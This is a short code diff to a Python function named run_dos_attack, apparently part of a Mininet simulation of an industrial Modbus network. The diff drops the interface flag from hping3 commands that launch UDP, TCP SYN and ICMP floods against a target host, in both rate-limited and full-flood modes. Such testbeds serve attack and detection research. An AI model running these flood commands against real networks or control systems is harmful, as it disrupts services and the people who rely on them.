@@ -132,19 +132,19 @@ def run_dos_attack(net, mode="light", host_log_dir=None):
 
         # UDP ringan
         h5.cmd(
-            f"hping3 --udp -I h5-eth1 -p {target_port} -i u100 {target_ip} "
+            f"hping3 --udp -p {target_port} -i u100 {target_ip} "
             f">> {host_log_q} 2>&1 &"
         )
 
         # TCP SYN ringan (ganggu koneksi)
         h5.cmd(
-            f"hping3 -S -I h5-eth1 -p {target_port} -i u200 {target_ip} "
+            f"hping3 -S -p {target_port} -i u200 {target_ip} "
             f">> {host_log_q} 2>&1 &"
         )
 
         # ICMP ringan (naikin RTT)
         h5.cmd(
-            f"hping3 --icmp -I h5-eth1 -i u200 {target_ip} "
+            f"hping3 --icmp -i u200 {target_ip} "
             f">> {host_log_q} 2>&1 &"
         )
 
@@ -155,19 +155,19 @@ def run_dos_attack(net, mode="light", host_log_dir=None):
 
         # UDP flood (bandwidth killer)
         h5.cmd(
-            f"hping3 --udp --flood -I h5-eth1 -p {target_port} {target_ip} "
+            f"hping3 --udp --flood -p {target_port} {target_ip} "
             f">> {host_log_q} 2>&1 &"
         )
 
         # TCP SYN flood (paling penting buat Modbus)
         h5.cmd(
-            f"hping3 -S --flood -I h5-eth1 -p {target_port} {target_ip} "
+            f"hping3 -S --flood -p {target_port} {target_ip} "
             f">> {host_log_q} 2>&1 &"
         )
 
         # ICMP flood (tambahan delay)
         h5.cmd(
-            f"hping3 --icmp --flood -I h5-eth1 {target_ip} "
+            f"hping3 --icmp --flood {target_ip} "
             f">> {host_log_q} 2>&1 &"
         )
 
